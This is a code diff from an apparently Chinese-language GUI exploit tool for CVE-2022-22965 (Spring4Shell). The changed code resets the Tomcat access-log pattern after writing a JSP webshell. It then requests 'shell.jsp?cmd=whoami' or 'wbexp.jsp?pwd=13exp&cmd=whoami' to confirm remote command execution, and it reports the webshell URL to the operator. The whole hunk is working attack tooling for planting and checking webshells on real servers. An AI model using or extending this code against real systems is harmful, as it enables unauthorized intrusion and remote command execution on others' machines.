@@ -830,15 +830,23 @@ class RootFrom:
                     sleep(1)
                     pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
                     ret = requests.post(url, headers=post_headers, data=pattern_data, verify=False)
-                    back = "[+]Wirte Shell Response Code: %d" % ret.status_code
+                    back = "[+]Wirte Shell Response Code: %d 等待验证" % ret.status_code
                     self.info_text.insert(tk.INSERT,back)
                     self.info_text.insert(tk.INSERT, '\n')
-                if Vule == "CVE-2022-22965":
+                if filename == "shell":
+                    test = requests.get(url + filename +".jsp?cmd=whoami")
+                elif filename == "wbexp":
+                    test = requests.get(url + filename +".jsp")
+                if Vule == "CVE-2022-22965" and ('//' in str(test.text)):
                     back = "[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：" + url + "shell.jsp?cmd=whoami"
                     self.info_text.insert(tk.INSERT,back)
                     self.info_text.insert(tk.INSERT, '\n')
-                elif Vule == "22965-13exp-shell":
+                elif Vule == "22965-13exp-shell" and ('13exp' in str(test.text)):
                     back = "[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：" + url + "wbexp.jsp?pwd=13exp&cmd=whoami"
+                    self.info_text.insert(tk.INSERT,back)
+                    self.info_text.insert(tk.INSERT, '\n')
+                else:
+                    back = "[-] CVE-2022-22965漏洞不存在或者已经被利用,shell地址自行扫描"
                     self.info_text.insert(tk.INSERT,back)
                     self.info_text.insert(tk.INSERT, '\n')
             else:
